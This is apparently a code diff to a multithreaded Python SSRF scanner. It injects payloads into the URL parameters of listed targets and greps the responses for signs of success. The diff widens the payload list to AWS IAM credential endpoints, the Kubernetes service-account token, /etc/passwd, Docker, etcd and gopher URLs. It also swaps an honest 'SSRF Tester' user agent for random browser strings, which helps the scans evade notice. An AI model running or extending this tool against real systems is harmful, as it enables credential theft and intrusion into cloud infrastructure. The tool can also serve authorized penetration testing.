@@ -5,8 +5,11 @@ from urllib.parse import urlparse, parse_qs, urlencode
 import threading
 import csv
 import sys
+import random
 from colorama import Fore, Style, init
 import re
+import logging
+import time
 
 # Initialize colorama for colored console output
 init(autoreset=True)
@@ -15,6 +18,17 @@ init(autoreset=True)
 from urllib3.exceptions import InsecureRequestWarning
 import urllib3
 urllib3.disable_warnings(InsecureRequestWarning)
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(message)s')
+
+# List of User-Agent strings for random selection
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+    'Mozilla/5.0 (X11; Linux x86_64)',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
+]
 
 # Define SSRF payloads with their corresponding grep keywords or regex patterns
 ssrf_payloads_with_keywords = [
@@ -25,148 +39,171 @@ ssrf_payloads_with_keywords = [
     },
     {
         "payload": "http://169.254.169.254/latest/user-data/",
-        "keywords": [r"instance-id", r"user-data", r"local-ipv4"]
+        "keywords": [r"user-data", r"password", r"public-keys", r"ssh-rsa"]
     },
     {
         "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-        "keywords": [r"role", r"accessKeyId", r"secretAccessKey"]
+        "keywords": [r"AccessKeyId", r"SecretAccessKey", r"Token"]
     },
-    
     # Azure Metadata Service
     {
         "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         "keywords": [r"compute", r"subscriptionId", r"vmId", r"tenantId"],
         "headers": {"Metadata": "true"}
     },
-    
     # Google Cloud Metadata Service
     {
         "payload": "http://metadata.google.internal/computeMetadata/v1/",
-        "keywords": [r"metadata", r"computeMetadata", r"Google"],
+        "keywords": [r"instance", r"hostname", r"project"],
         "headers": {"Metadata-Flavor": "Google"}
     },
-    
     # Alibaba Cloud Metadata Service
     {
         "payload": "http://100.100.100.200/latest/meta-data/",
-        "keywords": [r"InstanceId", r"PrivateIpAddress", r"PublicIpAddress"]
+        "keywords": [r"InstanceId", r"ImageId", r"RegionId"]
     },
-    
+    # DigitalOcean Metadata Service
+    {
+        "payload": "http://169.254.169.254/metadata/v1/",
+        "keywords": [r"hostname", r"vendor_data", r"public_keys"]
+    },
+    # Kubernetes API
+    {
+        "payload": "https://kubernetes.default.svc/",
+        "keywords": [r"Unauthorized", r"forbidden", r"apiVersion"],
+        "headers": {"Authorization": "Bearer "},
+        "verify_ssl": False
+    },
     # Localhost and Internal Services
     {
-        "payload": "http://localhost:80/",
-        "keywords": [r"HTTP/1\.1 200 OK", r"localhost"]
+        "payload": "http://localhost/",
+        "keywords": [r"localhost", r"welcome", r"it works"]
     },
     {
         "payload": "http://127.0.0.1/",
-        "keywords": [r"127\.0\.0\.1", r"localhost"]
+        "keywords": [r"localhost", r"welcome", r"it works"]
     },
     {
         "payload": "http://[::1]/",
-        "keywords": [r"localhost"]
+        "keywords": [r"localhost", r"welcome", r"it works"]
     },
     {
-        "payload": "http://192.168.1.1/",
-        "keywords": [r"192\.168\.1\.1", r"router", r"admin"]
+        "payload": "http://192.168.0.1/",
+        "keywords": [r"admin", r"router", r"login"]
     },
     {
-        "payload": "http://internal-server.local/",
-        "keywords": [r"internal", r"HTTP/1\.1 200 OK"]
+        "payload": "http://10.0.0.1/",
+        "keywords": [r"admin", r"router", r"login"]
     },
-    
     # FTP Service
     {
         "payload": "ftp://127.0.0.1:21/",
-        "keywords": [r"ftp", r"220", r"331 User"]
+        "keywords": [r"ftp", r"220", r"331"]
     },
-    
     # File Protocol
     {
         "payload": "file:///etc/passwd",
-        "keywords": [r"root:x:0:0", r"/bin/bash", r"/bin/sh", r"nologin"]
+        "keywords": [r"root:x:0:0", r"/bin/bash"]
     },
-    
+    {
+        "payload": "file:///c:/Windows/System32/drivers/etc/hosts",
+        "keywords": [r"127\.0\.0\.1", r"localhost"]
+    },
     # SMB Service
     {
         "payload": "smb://127.0.0.1/share",
-        "keywords": [r"smb", r"445", r"NetBIOS", r"server share"]
+        "keywords": [r"smb", r"445", r"network"]
     },
-    
+    # Redis Service
+    {
+        "payload": "redis://localhost:6379/",
+        "keywords": [r"redis_version", r"redis_mode"]
+    },
     # Additional Internal Services
     {
         "payload": "http://localhost:6379/",
-        "keywords": [r"redis_version", r"running", r"redis-cli"]
+        "keywords": [r"redis_version", r"redis_mode"]
     },
     {
         "payload": "http://localhost:11211/",
-        "keywords": [r"VERSION", r"STAT", r"END"]
+        "keywords": [r"STAT", r"VERSION", r"END"]
     },
     {
         "payload": "http://localhost:27017/",
-        "keywords": [r"MongoDB", r"db version", r"connections"]
-    },
-    {
-        "payload": "http://localhost:5432/",
-        "keywords": [r"PostgreSQL", r"version", r"Connection authorized"]
-    },
-    {
-        "payload": "http://localhost:8080/",
-        "keywords": [r"Welcome", r"Dashboard", r"API"]
+        "keywords": [r"MongoDB", r"db version"]
     },
     {
         "payload": "http://localhost:3306/",
-        "keywords": [r"MySQL", r"version", r"Protocol"]
+        "keywords": [r"MySQL", r"5\.", r"MariaDB"]
     },
     {
-        "payload": "http://localhost:22/",
-        "keywords": [r"SSH", r"OpenSSH"]
+        "payload": "http://localhost:8000/",
+        "keywords": [r"development server", r"Django"]
     },
     {
-        "payload": "http://localhost:25/",
-        "keywords": [r"220", r"SMTP", r"ESMTP"]
+        "payload": "http://localhost:8080/",
+        "keywords": [r"Apache", r"Tomcat", r"Jetty"]
     },
+    # Docker API
     {
-        "payload": "http://localhost:53/",
-        "keywords": [r"DNS", r"Server", r"Response"]
+        "payload": "http://localhost:2375/images/json",
+        "keywords": [r"Id", r"Created", r"RepoTags"]
     },
+    # Elasticsearch
+    {
+        "payload": "http://localhost:9200/_cat",
+        "keywords": [r"health", r"indices", r"shards"]
+    },
+    # Jenkins
+    {
+        "payload": "http://localhost:8080/",
+        "keywords": [r"Jenkins", r"Continuous Integration"]
+    },
+    # RabbitMQ
+    {
+        "payload": "http://localhost:15672/",
+        "keywords": [r"RabbitMQ", r"Management"]
+    },
+    # CouchDB
+    {
+        "payload": "http://localhost:5984/_utils/",
+        "keywords": [r"CouchDB", r"Welcome"]
+    },
+    # Kubernetes Service Account Token
+    {
+        "payload": "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
+        "keywords": [r"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9"]  # Base64 JWT header
+    },
+    # EC2 Credentials
+    {
+        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
+        "keywords": [r"AccessKeyId", r"SecretAccessKey", r"Token"]
+    },
+    # etcd Keys
+    {
+        "payload": "http://127.0.0.1:2379/v2/keys/",
+        "keywords": [r"etcd", r"key", r"value"]
+    },
+    # Gopher Protocol (for internal port scanning)
+    {
+        "payload": "gopher://127.0.0.1:11211/_stats",
+        "keywords": [r"STAT", r"END"]
+    },
+    # SMTP Service
     {
         "payload": "smtp://localhost:25/",
         "keywords": [r"220", r"SMTP", r"ESMTP"]
     },
-    
-    # Additional OS Files
+    # DNS over HTTP
     {
-        "payload": "file:///C:/Windows/System32/drivers/etc/hosts",
-        "keywords": [r"127\.0\.0\.1", r"localhost"]
-    },
-    {
-        "payload": "file:///C:/Windows/win.ini",
-        "keywords": [r"\[fonts\]", r"signature"]
-    },
-    {
-        "payload": "file:///var/log/syslog",
-        "keywords": [r"syslog", r"error", r"warning"]
-    },
-    {
-        "payload": "file:///proc/version",
-        "keywords": [r"Linux", r"version", r"gcc"]
-    },
-    
-    # Kubernetes Service
-    {
-        "payload": "http://kubernetes.default.svc.cluster.local/",
-        "keywords": [r"serviceaccount", r"namespace", r"token"]
-    },
-    
-    # Redis Sentinel
-    {
-        "payload": "http://localhost:26379/",
-        "keywords": [r"Redis Sentinel", r"role", r"monitor"]
+        "payload": "http://localhost:53/dns-query?name=localhost",
+        "keywords": [r"DNS", r"Query", r"Answer"]
     },
 ]
 
 # Initialize a lock for thread-safe operations
 file_lock = threading.Lock()
+print_lock = threading.Lock()
 
 def compile_patterns(keywords):
     """
@@ -176,10 +213,10 @@ def compile_patterns(keywords):
     compiled = []
     for kw in keywords:
         try:
-            compiled.append(re.compile(kw))
+            compiled.append(re.compile(kw, re.IGNORECASE))
         except re.error:
             # If the pattern is invalid, treat it as a plain string
-            compiled.append(re.compile(re.escape(kw)))
+            compiled.append(re.compile(re.escape(kw), re.IGNORECASE))
     return compiled
 
 # Pre-compile all regex patterns for efficiency
@@ -197,7 +234,7 @@ def grep_response(response_text, compiled_keywords):
             return pattern.pattern
     return "No match"
 
-def send_request(session, url, param, payload, compiled_keywords, headers=None):
+def send_request(session, url, param, payload, compiled_keywords, headers=None, timeout=10, verify_ssl=True):
     """
     Inject the payload into the specified parameter and send the HTTP request.
     Returns the new URL and the result of keyword matching.
@@ -206,18 +243,22 @@ def send_request(session, url, param, payload, compiled_keywords, headers=None):
     query_params = parse_qs(parsed_url.query)
 
     # Replace the target parameter with the SSRF payload
-    query_params[param] = payload
+    query_params[param] = [payload]
     new_query = urlencode(query_params, doseq=True)
-    new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
+    new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+    if new_query:
+        new_url += f"?{new_query}"
+    if parsed_url.fragment:
+        new_url += f"#{parsed_url.fragment}"
 
     try:
-        response = session.get(new_url, timeout=10, verify=False, headers=headers)
+        response = session.get(new_url, timeout=timeout, verify=verify_ssl, headers=headers)
         keyword_found = grep_response(response.text, compiled_keywords)
         return (new_url, keyword_found)
     except requests.RequestException as e:
         return (new_url, f"Error: {e}")
 
-def process_url(session, url, ssrf_payloads, results):
+def process_url(session, url, ssrf_payloads, results, timeout, delay):
     """
     Process a single URL by injecting all SSRF payloads into its parameters.
     Appends matched results or errors to the results list.
@@ -236,7 +277,8 @@ def process_url(session, url, ssrf_payloads, results):
             payload = payload_entry["payload"]
             compiled_keywords = payload_entry["compiled_keywords"]
             headers = payload_entry.get("headers", {})
-            full_url, result = send_request(session, url, param, payload, compiled_keywords, headers=headers)
+            verify_ssl = payload_entry.get("verify_ssl", True)
+            full_url, result = send_request(session, url, param, payload, compiled_keywords, headers=headers, timeout=timeout, verify_ssl=verify_ssl)
             
             # Determine if the result is a match or an error
             is_match = False
@@ -245,16 +287,17 @@ def process_url(session, url, ssrf_payloads, results):
                 is_match = True
                 detected_keyword = result
             elif result.startswith("Error"):
-                is_match = True  # Errors are considered matches for logging purposes
+                is_match = False  # Errors are not considered matches
 
+            # Log only if a keyword is detected
             if is_match:
                 with file_lock:
                     # Extract the payload used from the new_url
                     parsed_new_url = urlparse(full_url)
                     new_query_params = parse_qs(parsed_new_url.query)
                     used_payload = new_query_params.get(param, [''])[0]
-
-                    # Append only matched results or errors
+    
+                    # Append matched results
                     results.append({
                         "Full URL": full_url,
                         "Keyword Detected": detected_keyword,
@@ -262,39 +305,40 @@ def process_url(session, url, ssrf_payloads, results):
                         "Payload": used_payload,
                         "Result": result
                     })
-
-            # Determine color based on the result
-            if is_match and detected_keyword:
+    
+                # Determine color based on the result
                 color = Fore.GREEN
                 status = "Found"
-            elif is_match and result.startswith("Error"):
-                color = Fore.YELLOW
-                status = "Error"
-            else:
-                color = Fore.RED
-                status = "Not Found"
 
-            # Print the detailed colored output
-            print(f"{color}[{status}] URL: {full_url}")
-            if detected_keyword:
-                print(f"{color}Keyword Detected: {detected_keyword}")
-            elif result.startswith("Error"):
-                print(f"{Fore.YELLOW}Error: {result}")
-            print(f"Parameter: {param}")
-            print(f"Payload Used: {payload}")
-            print("-" * 80)
+                # Prepare the detailed colored output
+                output_lines = [
+                    f"{color}[{status}] URL: {full_url}",
+                    f"{color}Keyword Detected: {detected_keyword}",
+                    f"Parameter: {param}",
+                    f"Payload Used: {payload}",
+                    "-" * 80
+                ]
+    
+                # Print the output with thread-safe printing
+                with print_lock:
+                    for line in output_lines:
+                        print(line)
 
-def worker(urls, ssrf_payloads, results):
+            # Delay between requests
+            if delay > 0:
+                time.sleep(delay)
+
+def worker(urls, ssrf_payloads, results, timeout, delay):
     """
     Worker function for each thread to process a list of URLs.
     """
     with requests.Session() as session:
-        # Customize session headers if needed
-        session.headers.update({'User-Agent': 'Mozilla/5.0 (SSRF Tester)'})
+        # Customize session headers
+        session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
         for url in urls:
             url = url.strip()
             if url:
-                process_url(session, url, ssrf_payloads, results)
+                process_url(session, url, ssrf_payloads, results, timeout, delay)
 
 def main():
     """
@@ -304,6 +348,8 @@ def main():
     parser.add_argument('-i', '--input', required=True, help="Input file containing URLs")
     parser.add_argument('-o', '--output', required=True, help="Output CSV file to store results")
     parser.add_argument('-t', '--threads', type=int, default=10, help="Number of threads (optional)")
+    parser.add_argument('--timeout', type=int, default=10, help="Request timeout in seconds (optional)")
+    parser.add_argument('--delay', type=float, default=0, help="Delay between requests in seconds (optional)")
 
     args = parser.parse_args()
 
@@ -333,16 +379,16 @@ def main():
     with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
         futures = []
         for chunk in url_chunks:
-            futures.append(executor.submit(worker, chunk, ssrf_payloads_with_keywords, results))
+            futures.append(executor.submit(worker, chunk, ssrf_payloads_with_keywords, results, args.timeout, args.delay))
 
-        # Optional: Display progress or handle completed futures
+        # Handle completed futures
         for future in concurrent.futures.as_completed(futures):
             try:
                 future.result()
             except Exception as e:
                 print(f"{Fore.YELLOW}An error occurred in a thread: {e}")
 
-    # Write only matched results to the output CSV file
+    # Write matched results to the output CSV file
     with file_lock:
         try:
             with open(args.output, 'w', newline='', encoding='utf-8') as csvfile:
